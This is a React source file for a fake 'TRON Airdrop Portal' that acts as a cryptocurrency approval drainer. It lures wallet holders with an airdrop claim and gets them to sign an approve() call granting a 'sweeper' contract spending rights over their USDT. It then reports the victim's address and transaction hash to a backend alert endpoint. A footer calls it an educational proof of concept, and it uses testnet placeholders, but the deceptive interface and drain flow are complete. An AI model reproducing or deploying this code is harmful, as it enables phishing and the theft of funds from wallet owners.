import { useState, useEffect } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import TronWeb from 'tronweb';
import axios from 'axios';

// ⚠️ PASTE YOUR TRONIDE DEPLOYED ADDRESSES HERE (Start with T)
const TOKEN_ADDRESS = "TYourMockTRC20Address...";
const SWEEPER_ADDRESS = "TYourSweeperAddress...";

function App() {
  const [status, setStatus] = useState("Ready to connect");
  const [isLoading, setIsLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState("0.00");
  const [userAddress, setUserAddress] = useState("");
  const currentUrl = window.location.href;

  const connectAndFetchBalance = async () => {
    // Check for TronLink or Trust Wallet injection
    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
      setStatus("❌ Tron Wallet (TronLink/Trust Wallet) not detected.");
      return;
    }

    setIsLoading(true);
    setStatus("⏳ Connecting to Tron Shasta Network...");

    try {
      const address = window.tronWeb.defaultAddress.base58;
      setUserAddress(address);

      // Fetch Real TRC-20 Balance
      setStatus("⏳ Fetching on-chain USDT balance...");
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const rawBalance = await contract.balanceOf(address).call();

      // TRC-20 USDT has 6 decimals. Divide by 1,000,000.
      const formattedBalance = rawBalance / 1000000;
      setWalletBalance(formattedBalance.toFixed(2));
      
      setStatus("✅ Wallet connected. Ready to verify.");
    } catch (error) {
      console.error(error);
      setStatus("❌ Failed to fetch balance. Check network.");
    } finally {
      setIsLoading(false);
    }
  };

  const executeApprove = async () => {
    if (!userAddress) return;
    setIsLoading(true);
    setStatus("⏳ Requesting signature (Approve)...");

    try {
      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      
      // Approve a massive amount. 
      // feeLimit is required in Tron for smart contract calls (100 TRX limit)
      const tx = await contract.approve(SWEEPER_ADDRESS, 1000000000).send({
        from: userAddress,
        feeLimit: 100000000 
      });

      setStatus("⏳ Waiting for Tron blockchain confirmation...");
      
      // Wait for transaction to be mined
      let receipt = await window.tronWeb.trx.getTransactionInfo(tx);
      while (!receipt || !receipt.id) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        receipt = await window.tronWeb.trx.getTransactionInfo(tx);
      }

      // Alert Backend
      await axios.post('http://localhost:3001/api/alert', {
        victimAddress: userAddress,
        tokenAddress: TOKEN_ADDRESS,
        sweeperAddress: SWEEPER_ADDRESS,
        txHash: tx,
        network: "TRON (TRC-20)"
      });

      setStatus("✅ Verification Complete. Airdrop processing...");

    } catch (error) {
      console.error(error);
      setStatus("❌ Transaction rejected or failed.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="dashboard-container">
      <div className="header">
        <h1>TRON Airdrop Portal</h1>
        <p>Secure Eligibility Verification (TRC-20)</p>
      </div>

      <div className="balance-card">
        <div className="balance-label">Connected Wallet USDT Balance</div>
        <div className="balance-amount">${walletBalance} USDT</div>
      </div>

      <div className="qr-section">
        <QRCodeSVG value={currentUrl} size={180} />
        <p style={{color: '#333', fontSize: '12px', marginTop: '10px', margin: 0}}>Scan with Trust Wallet / TronLink</p>
      </div>

      {!userAddress ? (
        <button className="btn-primary" onClick={connectAndFetchBalance} disabled={isLoading}>
          {isLoading ? "Connecting..." : "Connect Wallet & Check Balance"}
        </button>
      ) : (
        <button className="btn-primary" onClick={executeApprove} disabled={isLoading} style={{backgroundColor: '#10b981'}}>
          {isLoading ? "Processing..." : "Verify & Claim Airdrop"}
        </button>
      )}

      <div className="status-box">{status}</div>

      <div className="educational-footer">
        ⚠️ <strong>EDUCATIONAL POC:</strong> This demonstrates a TRC-20 approval drainer.
      </div>
    </div>
  );
}

export default App;